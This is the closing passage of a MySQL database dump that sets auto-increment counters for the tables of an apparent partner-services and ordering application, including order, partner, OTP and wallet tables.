--
ALTER TABLE `tbl_partner_service`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=327;

--
-- AUTO_INCREMENT for table `tbl_partner_vaccination_certificate`
--
ALTER TABLE `tbl_partner_vaccination_certificate`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;

--
-- AUTO_INCREMENT for table `tbl_payment_list`
--
ALTER TABLE `tbl_payment_list`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT for table `tbl_product`
--
ALTER TABLE `tbl_product`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8;

--
-- AUTO_INCREMENT for table `tbl_prtner_address`
--
ALTER TABLE `tbl_prtner_address`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=10;

--
-- AUTO_INCREMENT for table `tbl_sanitization`
--
ALTER TABLE `tbl_sanitization`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=9;

--
-- AUTO_INCREMENT for table `tbl_sub_order`
--
ALTER TABLE `tbl_sub_order`
  MODIFY `id` bigint(20) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=20;

--
-- AUTO_INCREMENT for table `tbl_testimonial`
--
ALTER TABLE `tbl_testimonial`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT for table `tbl_user`
--
ALTER TABLE `tbl_user`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=57;

--
-- AUTO_INCREMENT for table `temp_forgot_passwor_otp_tbl`
--
ALTER TABLE `temp_forgot_passwor_otp_tbl`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=15;

--
-- AUTO_INCREMENT for table `temp_order_partner_tbl`
--
ALTER TABLE `temp_order_partner_tbl`
  MODIFY `id` bigint(20) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=17;

--
-- AUTO_INCREMENT for table `temp_partner_forgot_passwor_otp_tbl`
--
ALTER TABLE `temp_partner_forgot_passwor_otp_tbl`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8;

--
-- AUTO_INCREMENT for table `temp_partner_login_otp`
--
ALTER TABLE `temp_partner_login_otp`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=102;

--
-- AUTO_INCREMENT for table `temp_tbl`
--
ALTER TABLE `temp_tbl`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=134;

--
-- AUTO_INCREMENT for table `time_date`
--
ALTER TABLE `time_date`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wallet_report`
--
ALTER TABLE `wallet_report`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
